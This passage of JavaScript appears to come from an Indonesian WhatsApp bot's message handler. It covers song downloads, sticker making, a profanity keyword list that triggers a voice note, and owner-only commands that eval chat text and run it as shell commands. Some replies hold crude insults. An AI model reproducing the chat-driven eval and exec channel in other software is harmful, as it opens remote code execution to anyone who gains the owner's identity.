            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("*Woy Anj Hasil Nya Kagak Ketemu🫩*")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukin Text Nya Lah kntol");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nKazeo Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Alfread Idaman para ciwi²" })
}
    }
//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================
 
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

//================================
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

 if (budy.startsWith('$')) {
     if (!isCreator) return m.reply(mess.owner)
     exec(budy.slice(2), (err, stdout) => {
         if (err) return m.reply(`${err}`)
         if (stdout) return m.reply(stdout)
     })
 }
//================================================================================
 if (!m.isGroup) {
     let user = db.users[m.sender];
     const cooldown = 21600000;
     if (new Date() - user.pc < cooldown) return; 
     let caption = `Hᴀʟᴏ @${m?.sender.split('@')[0]} ${salam}, ada yang bisa saya bantu?`.trim();
     Ditss.sendMessage(m.chat, {
         text: caption,
         mentions: [m.sender]
     }, {
         quoted: fsaluran
     })
     user.pc = new Date() * 1;
 }
}
} catch (err) {
console.log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
//await Ditss.sendMessage(global.bott + "@s.whatsapp.net", {text: `terjadi kesalahan over-limit!!!`}, {quoted:m})
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
//m.reply(util.format(err))
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});